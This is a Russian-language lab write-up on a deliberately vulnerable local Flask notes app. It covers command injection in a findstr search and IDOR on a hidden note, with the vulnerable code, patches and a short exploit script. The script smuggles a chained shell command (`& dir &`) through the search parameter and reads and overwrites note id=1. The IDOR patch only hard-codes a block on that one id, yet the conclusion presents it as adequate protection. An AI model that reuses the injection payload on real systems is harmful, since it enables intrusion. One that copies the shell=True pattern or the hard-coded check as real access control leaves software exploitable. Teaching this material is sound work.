# Лабораторная работа: уязвимости веб-приложения

## Дисклеймер

Репозиторий создан в образовательных целях. Приложение намеренно уязвимо и предназначено только для локального запуска (`127.0.0.1`). Код не предназначен для продакшена или использования против систем без разрешения владельца.

---

## Описание приложения

`lab2.py` — простое веб-приложение для заметок на Flask. Главная страница позволяет создать заметку по заголовку и содержит форму поиска по заметкам. Поиск реализован через системную утилиту `findstr`, которая ищет совпадения в текстовом файле `notes_log.txt`, куда логируются заголовки всех созданных заметок. Каждая заметка доступна по отдельному адресу с параметром `id`, где можно посмотреть и отредактировать её текст, а также удалить заметку по ссылке. Одна из заметок (`id=1`) содержит условно секретные данные и не отображается в списке на главной странице, но технически доступна напрямую по её `id`.

Мной выбраны и разобраны две уязвимости: Command Injection в поиске и IDOR в доступе к заметкам.

---

## Уязвимость 1: Command Injection (`/search`)

**Причина:** параметр поиска `q` подставляется напрямую в shell-команду без экранирования.

`lab2.py`:
```python
raw = subprocess.run(f'findstr "{q}" notes_log.txt', shell=True, capture_output=True).stdout
```

`patch_lab2.py`:
```python
raw = subprocess.run(['findstr', q, 'notes_log.txt'], capture_output=True).stdout
```

**Исправление:** команда передаётся списком аргументов, без запуска системной оболочки (`shell=True` убран).

---

## Уязвимость 2: IDOR (`/note`)

**Причина:** доступ к заметке по `id` выдаётся без проверки прав.

`lab2.py`:
```python
if note_id not in NOTES:
    return redirect("/")
```

`patch_lab2.py`:
```python
if note_id not in NOTES or note_id == 1:
    return redirect("/")
```

**Исправление:** доступ к заметке `id=1` заблокирован.

## Эксплуатация уязвимостей (`lab2_exp.py`)

```python
import requests

URL = "http://127.0.0.1:5000"


def injection():
    requests.post(URL + "/", data={"title": "test"})
    t1 = 'test" notes_log.txt & dir & "'
    exp1 = requests.get(URL + "/search", params={"q": t1})
    print(exp1.text)

def idor():
    admin_note_id = 1
    exp2 = requests.get(URL + "/note", params={"id": admin_note_id})
    print(exp2.text)
    exp3 = requests.post(URL + "/note", params={"id": admin_note_id}, data={"text": "ВЗЛОМАНО через IDOR"})
    print(exp3.text)

if __name__ == "__main__":
    injection()
    idor()
```

**`injection()`:** создаёт тестовую заметку, затем отправляет в `/search` параметр `q`, в котором закрывается кавычка исходной команды и через `&` дописывается системная команда `dir`. При уязвимом сервере в ответе возвращается не только результат поиска, но и вывод команды `dir`.

**`idor()`:** напрямую запрашивает и изменяет заметку `id=1`, на которую нет ссылки в интерфейсе. При уязвимом сервере заметка доступна и редактируется без проверки прав.

Против `patch_lab2.py` оба сценария не приводят к утечке данных или выполнению посторонних команд.

| Уязвимость | OWASP категория | Причина | Исправление |
|---|---|---|---|
| Command Injection | A03:2021 — Injection | `shell=True` + пользовательский ввод в строке команды | список аргументов, без shell |
| IDOR | A01:2021 — Broken Access Control | нет проверки прав доступа к объекту по id | блокировка доступа к id=1 |

## Вывод

В ходе работы на примере простого веб-приложения на Flask были изучены две распространённые уязвимости: Command Injection и IDOR. Обе возникли из-за недостаточной проверки данных, поступающих от пользователя: в первом случае ввод подставлялся в системную команду без экранирования, во втором — доступ к ресурсу выдавался без проверки прав. С помощью демонстрационного скрипта обе уязвимости были подтверждены на практике, после чего устранены точечными изменениями кода: отказом от shell=True в пользу передачи аргументов списком и добавлением явной проверки доступа к защищённому объекту. Работа показала, что для защиты приложения достаточно не доверять входным данным по умолчанию и явно проверять права на каждом запросе.
